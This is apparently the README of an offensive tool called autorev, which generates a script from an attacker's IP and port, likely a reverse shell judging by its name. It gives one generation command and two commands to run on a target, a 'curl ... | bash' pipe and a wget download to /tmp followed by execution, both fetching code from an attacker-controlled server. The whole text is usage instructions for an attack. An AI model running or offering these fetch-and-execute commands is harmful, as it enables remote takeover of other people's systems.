# autorev.sh  
## Generating Usage  
```
python3 autorev.py -i <your-ip> -p <your-port>
```
## Using It On Target  
### Curl  
```
curl <your-temp-server-ip>/autorev.sh | bash
```
### Wget  
```
wget <your-temp-server-ip>/autorev.sh -O /tmp/autorev.sh && bash /tmp/autorev.sh
```
